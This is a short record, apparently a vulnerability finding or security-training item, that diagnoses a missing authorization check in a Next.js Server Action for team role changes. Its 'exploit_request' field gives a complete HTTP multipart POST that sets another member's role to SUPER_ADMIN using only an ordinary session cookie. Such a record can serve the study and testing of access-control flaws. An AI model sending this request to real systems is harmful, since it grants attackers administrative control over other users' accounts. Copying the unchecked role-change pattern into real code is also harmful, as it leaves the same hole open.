diagnosis: The Next.js Server Action enforces session authentication, but extracts memberId directly from client-submitted FormData and applies a role change without verifying that session.user has administrative or owner privileges in the team to which memberId belongs. Any authenticated user can promote their own or another member's account to admin status.
exploit_request:
POST /dashboard/team HTTP/1.1
Host: app.enterprisehrm.io
Cookie: authjs.session-token=<user_cookie>
Next-Action: d38f9024b8aa21
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="memberId"

mem_victim_emp_9918
------WebKitFormBoundary
Content-Disposition: form-data; name="role"

SUPER_ADMIN
------WebKitFormBoundary--
